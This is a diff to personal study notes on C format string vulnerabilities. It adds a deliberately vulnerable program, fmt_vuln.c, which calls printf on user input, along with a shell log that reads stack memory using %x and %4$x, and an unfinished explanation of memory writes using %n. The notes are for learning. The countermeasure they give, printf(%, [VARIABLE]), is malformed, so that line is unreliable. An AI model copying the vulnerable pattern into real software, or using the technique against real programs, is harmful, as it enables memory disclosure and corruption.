@@ -399,7 +399,42 @@ In C files are handled by 2 different ways file descriptors and file streams. Fi
 We reference format strings [earlier](https://github.com/adminprivileges/skillbridgreNotes#things-to-remember) in the notes, but what we fail to mention is the fact that ther are stored alongside the variable in the stack when a ```printf()``` function is called. To learn more about this, check out [this link](https://axcheron.github.io/exploit-101-format-strings/) . 
 - Since format strings are stored on the stack, if proper input control validation isn't exercised, then the address of the format string can be overflowed leading to arbirtary memory read and write capabilities.
 - Similar to ```scanf()```, ```printf``` has the ability to be abused to allow for overflow without proper input validation. 
-  - The biggest countermeasure for this is to only accept input in the form of a format string to ensure that ```printf()``` interprets the totality of the argument it is sent as one contiguous string. This is done by using ```printf(%, [VARIABLE])``` instead of ```printf([VARIABLE])``` .  
+  - The biggest countermeasure for this is to only accept input in the form of a format string to ensure that ```printf()``` interprets the totality of the argument it is sent as one contiguous string. This is done by using ```printf(%, [VARIABLE])``` instead of ```printf([VARIABLE])``` .
+    - <details><summary>fmt_vuln.c</summary>
+
+        ```c
+        #include <stdio.h>
+        #include <stdlib.h>
+        #include <string.h>
+
+        int main(int argc, char *argv[]) {
+          char text[1024];
+          static int test_val = -72;
+
+          if(argc < 2) {
+              printf("Usage: %s <text to print>\n", argv[0]);
+              exit(0);
+          }
+          strcpy(text, argv[1]);
+
+          printf("The right way to print user-controlled input:\n");
+          printf("%s", text);
+
+
+          printf("\nThe wrong way to print user-controlled input:\n");
+          printf(text);
+
+          printf("\n");
+
+          // Debug output
+          printf("[*] test_val @ 0x%08x = %d 0x%08x\n", &test_val, test_val, 
+        test_val);
+
+          exit(0);
+        }
+        ```
+    </details>
+
     - <details> <summary>example output</summary>
 
         ```
@@ -411,9 +446,32 @@ We reference format strings [earlier](https://github.com/adminprivileges/skillbr
         ```
         *Note: In the same way that ```testing %x``` can be used to examine the next memory address, this can be repeated indefinitely to read stack memory*
     </details>
+#### Writing to a buffer
+- Just like data can be read from memory using format strings, it can be written using them as well. The ```%n``` format string is used to write the ammount of bytes written so far. If we can influence the data written so far, we can effectively write to a memory address that we control, the intended variable.
+  - In order to find the offset from the the format string buffer to tthe intended variable you can place a predictable string (like AAAA) and pair it with a multitude of repeated format strings (```%x```) until  
+- Data can be written to our intended variable in one of two ways
+  - Manipulating the field width of your format strings for 4 consecutive writes, slowly changing the value (im gonna be honest, i dont understand this one as well as i should so im gonna skip the explanation)
+  - Using Direct parameter access to simplify the above method for simpler, single execution writes (which i do understand so im going to explain).
+    -  <details><summary>Reading</summary>
 
-
-
+          Its a bit easier to explain writing if i explain reading first. In the same  way that ```./fmt_vuln AAAA%x%x%x%x``` can read ```AAAA...41414141```, ```./fmt_vuln AAAA%4\$x``` can be used to read ```AAAA41414141``` it does so by asking for the Nth occurence of a sequence with the special character ```$``` (which needs to be escaped since we are using this in the context of bash as an argument. ```%4/$x == %4$x```  which translates to the 4th occuence of the 4 byte hexadecimal sequence. 
+          ```
+          reader@hacking:~/booksrc $ ./fmt_vuln AAAA%x%x%x%x
+          The right way to print user-controlled input:
+          AAAA%x%x%x%x
+          The wrong way to print user-controlled input:
+          AAAAbffff3d0b7fe75fc041414141
+          [*] test_val @ 0x08049794 = -72 0xffffffb8
+          reader@hacking:~/booksrc $ ./fmt_vuln AAAA%4\$x
+          The right way to print user-controlled input:
+          AAAA%4$x
+          The wrong way to print user-controlled input:
+          AAAA41414141
+          [*] test_val @ 0x08049794 = -72 0xffffffb8 
+          reader@hacking:~/booksrc $
+          ```
+      </details>
+    - Writing: To write data you must first read the data inside the memory address you would like to write too, you can do so by effectivey "zeroing" (or as close to it) the value, and then doing a litle bit math to rewrite the   ####END OF DAY
 ### Everything after this is rough notes that need to be formated
 ---
 - use ```atoi()``` (ASCII to INT) to change character type to int
